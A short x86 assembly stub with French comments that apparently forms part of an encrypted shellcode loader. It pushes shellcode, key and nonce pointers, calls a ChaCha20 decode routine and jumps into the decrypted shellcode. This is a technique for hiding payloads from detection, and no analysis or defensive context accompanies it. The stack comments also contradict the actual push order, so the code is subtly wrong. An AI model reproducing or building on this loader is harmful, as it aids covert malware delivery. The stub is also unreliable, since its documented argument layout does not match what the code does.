; --- Arguments sur la pile ---
; [esp]     -> shell_len
; [esp+4]   -> shellcode_ptr
; [esp+8]   -> key_ptr
; [esp+12]  -> nonce_ptr

start:
    ; push arguments déjà faits (dans le stub)
    ; call chacha20_func (appel à la fonction de décodage)

    ; La fonction chacha20_decode_cpp(uint8_t* shellcode, uint32_t length, const uint8_t* key, const uint8_t* nonce)
    ; a cette signature typique cdecl :
    ; arguments: shellcode, length, key, nonce (dans cet ordre, mais ici inversé à cause du push)

    ; Stub:
    push shell_len
    push shellcode_ptr
    push key_ptr
    push nonce_ptr
    call chacha20_func
    ; call se fait avec rel32 offset

    ; Après le call, on veut sauter à shellcode décodé
    jmp dword ptr [shellcode_jmp_ptr]


